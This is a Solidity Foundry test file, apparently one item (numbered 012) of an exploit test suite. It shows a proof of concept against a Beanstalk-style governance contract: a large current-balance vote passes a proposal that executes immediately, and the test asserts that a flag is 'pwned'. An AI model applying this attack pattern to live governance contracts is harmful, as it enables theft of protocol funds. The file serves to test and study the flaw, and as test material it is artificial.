// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract MockVoteToken is IVoteToken {
    mapping(address => uint256) public balances;
    function set(address a, uint256 b) external { balances[a] = b; }
    function balanceOf(address account) external view returns (uint256) { return balances[account]; }
}

contract TargetFlag {
    bool public pwned;
    function setPwned() external { pwned = true; }
}

contract Exploit_012_beanstalk_governance is Test {
    function testExploit_FlashStyleVoteAndImmediateExecute() public {
        MockVoteToken token = new MockVoteToken();
        BeanstalkGovernance g = new BeanstalkGovernance(address(token));
        TargetFlag t = new TargetFlag();

        token.set(address(this), 1_500_000 ether);
        uint256 id = g.propose(address(t), abi.encodeWithSignature("setPwned()"));
        g.vote(id);
        g.execute(id);

        assertTrue(t.pwned(), "proposal should execute immediately with current-balance votes");
    }
}
